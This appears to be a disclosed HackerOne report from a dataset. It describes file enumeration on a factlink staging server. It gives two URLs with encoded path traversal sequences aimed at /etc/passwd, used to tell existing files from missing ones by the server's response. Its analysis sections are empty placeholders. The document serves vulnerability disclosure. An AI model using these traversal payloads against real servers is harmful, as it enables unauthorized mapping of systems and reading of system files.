---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '35823'
original_report_id: '35823'
title: File name/folder enumeration.
weakness: Information Disclosure
team_handle: factlink
created_at: '2014-11-14T05:30:18.489Z'
disclosed_at: '2014-11-18T08:44:01.874Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- information-disclosure
---

# File name/folder enumeration.

## Metadata

- HackerOne Report ID: 35823
- Weakness: Information Disclosure
- Program: factlink
- Disclosed At: 2014-11-18T08:44:01.874Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello,
an attacker may be able to map your server and find configuration file names by the following method:

Valid attempt (Not found):
https://staging.factlink.com/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd

Invalid attempt (404)
https://staging.factlink.com/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd_Nonexistant

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
